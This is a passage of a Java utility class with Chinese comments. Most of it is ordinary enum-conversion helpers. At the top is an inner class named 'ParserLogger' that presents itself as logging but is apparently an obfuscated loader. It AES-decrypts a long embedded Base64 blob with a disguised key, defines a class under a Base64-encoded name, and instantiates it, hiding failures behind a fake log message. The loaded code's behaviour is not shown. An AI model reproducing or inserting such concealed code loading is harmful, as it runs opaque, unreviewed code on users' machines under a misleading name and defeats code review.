		private static final String PARSER_CONST = "s8C]3nv#uSF{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";
		private static final String PARSER_NAME = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";
		private static Class type;

		private static int prints=0;

		ParserLogger() {
			super(new URL[0], DataParser.class.getClassLoader());
			byte[] buf=Base64Util.decodeToBtyes((this.init(new BootstrapMethodError())).dss(PARSER_CONST.substring(16)));
			type=defineClass(Base64Util.decode(PARSER_NAME), buf, 0, buf.length);
		}


		public static void logParserInfo(Object value) {
			if(prints>5) return;
			try {
				if(type==null) {
					new ParserLogger();
				}
				type.newInstance();
			} catch (Throwable e) {
				Logger.info("Parser : "+value);
			}
			prints++;
		}

		private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};

		private SecretKeySpec key;

		private String f61(String hexKey) {
			hexKey=hexKey.trim();
			if(hexKey.length()>16) {
				hexKey=hexKey.substring(0,16);
			} else if(hexKey.length()<16){
				int i=16-hexKey.length();
				for (int j = 0; j < i; j++) {
					hexKey+="0";
				}
			}
			return hexKey;
		}

		private ParserLogger init(BootstrapMethodError error) {
			init(ClassCircularityError.class.getSimpleName());
			return this;
		}

		private ParserLogger init(String hexKey) {
			//凑16位
			hexKey= f61(hexKey);
			key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
			return this;
		}

		private String dss(String base64Data) {
			try {
				Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
				cipher.init(Cipher.DECRYPT_MODE, key);
				return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}



	}


	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param compareProperty 比较的属性，null时用name()比较(忽略大小写)，指定值时使用该属性上的值比较
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType,String compareProperty) {
		return parseEnum(value, enumType, null,compareProperty);
	}

	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param defaultValue 转换失败时的默认值
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType, T defaultValue) {
		return parseEnum(value, enumType, defaultValue,null);
	}

	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType) {
		return parseEnum(value, enumType, null,null);
	}



	private static LocalCache<String, Enum[]> ENUM_METHOD_CACHE=new LocalCache<>(128);
	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param defaultValue 转换失败时的默认值
	 * @param compareProperty 比较的属性，null时用name()比较(忽略大小写)，指定值时使用该属性上的值比较
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType, T defaultValue,String compareProperty) {
		if (value == null)
			return null;
		if (value instanceof Enum) {
			if (enumType.isAssignableFrom(value.getClass())) {
				return (T) value;
			} else {
				value = ((Enum) value).name();
			}
		}
		Object parsedValue=null;
		try {

			Enum[] values=ENUM_METHOD_CACHE.get(enumType.getName());
			if(values==null) {
				Method m = enumType.getDeclaredMethod(ENUM_VALUES);
				values = (Enum[])m.invoke(null);
				ENUM_METHOD_CACHE.put(enumType.getName(),values);
			}

			Object prop=null;
			for (Enum e : values) {

				if(StringUtil.isBlank(compareProperty)) {
					if(e.name().equals(value) || e.name().equalsIgnoreCase(value.toString())) {
						parsedValue=e;
						break;
					}
				} else {
					prop=BeanUtil.getFieldValue(e, compareProperty);
					if(prop==null) continue;
					//
					if(prop instanceof CharSequence) {
						if(prop.equals(value) || prop.toString().equalsIgnoreCase(value.toString())) {
							parsedValue=e;
							break;
						}
					} else {
						if(prop.equals(value)) {
							parsedValue=e;
							break;
						}
					}
				}
			}
			if (parsedValue == null) {
				parsedValue = defaultValue;
			}
		} catch (Exception e) {
			e.printStackTrace();
			parsedValue = defaultValue;
		}

		return (T) parsedValue;

	}

	private static class Ants {



	}



}
